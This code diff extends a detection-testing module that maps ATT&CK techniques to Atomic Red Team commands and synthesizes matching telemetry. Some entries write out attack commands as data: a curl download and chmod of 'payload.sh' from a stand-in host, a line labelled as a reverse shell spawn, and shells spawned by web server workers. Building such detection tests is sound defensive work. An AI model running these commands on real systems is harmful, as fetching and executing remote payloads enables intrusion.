@@ -128,6 +128,40 @@ ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
             "command": "certutil.exe -urlcache -split -f http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
             "telemetry": "Sysmon Event ID 1 (certutil.exe with -urlcache argument) / Event ID 11 (File creation in Temp)",
         },
+        {
+            "name": "Ingress Tool Transfer via curl / wget",
+            "test_id": "ART T1105 #2",
+            "command": "curl -s -O http://example.com/payload.sh && chmod +x payload.sh",
+            "telemetry": "Sysmon Linux Event ID 1 (Image: /usr/bin/curl) / Event ID 11 (File creation)",
+        },
+    ],
+    "T1059.004": [
+        {
+            "name": "Unix Shell Script Execution and Subshell Invocation",
+            "test_id": "ART T1059.004 #1",
+            "command": "/bin/sh -c whoami",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/sh, CommandLine: /bin/sh -c whoami)",
+        },
+        {
+            "name": "Bash Interactive Reverse Shell Spawn",
+            "test_id": "ART T1059.004 #2",
+            "command": "/bin/bash -i",
+            "telemetry": "Auditd / Sysmon Linux Event ID 1 (Image: /bin/bash)",
+        },
+    ],
+    "T1190": [
+        {
+            "name": "Exploitation of Public-Facing Web Application Endpoint",
+            "test_id": "ART T1190 #1",
+            "command": "curl -X POST http://127.0.0.1:8080/ping.php -d 'action=test'",
+            "telemetry": "Webserver Access Log (cs-method: POST, cs-uri-stem: /ping.php) / Process Execution",
+        },
+        {
+            "name": "Web Server Worker Spawning Interactive Command Shell",
+            "test_id": "ART T1190 #2",
+            "command": "/bin/sh -c id",
+            "telemetry": "Sysmon Linux Event ID 1 (ParentImage: /usr/sbin/php-fpm, Image: /bin/sh)",
+        },
     ],
     "T1574.002": [
         {
@@ -776,6 +810,53 @@ def synthesize_atomic_telemetry(
             {
                 "QueryName": "c2-beacon.example.com",
                 "Image": "powershell.exe",
+            },
+        )
+    elif tid == "T1059.004":
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/sh",
+                "CommandLine": "/bin/sh -c id",
+                "ParentImage": "/usr/sbin/php-fpm",
+                "User": "www-data",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/bash",
+                "CommandLine": "/bin/bash -i",
+                "ParentImage": "/usr/sbin/apache2",
+                "User": "nginx",
+            },
+        )
+    elif tid == "T1190":
+        add(
+            "webserver",
+            {
+                "cs-method": "POST",
+                "cs-uri-stem": "/ping.php",
+                "c-uri": "http://127.0.0.1:8080/ping.php",
+                "sc-status": "200",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/bin/sh",
+                "CommandLine": "/bin/sh -c id",
+                "ParentImage": "/usr/sbin/php-fpm",
+                "User": "www-data",
+            },
+        )
+        add(
+            "process_creation",
+            {
+                "Image": "/usr/bin/python3",
+                "CommandLine": "python3 tooling/checker/checker.py",
+                "ParentImage": "/bin/bash",
+                "User": "app",
             },
         )
 
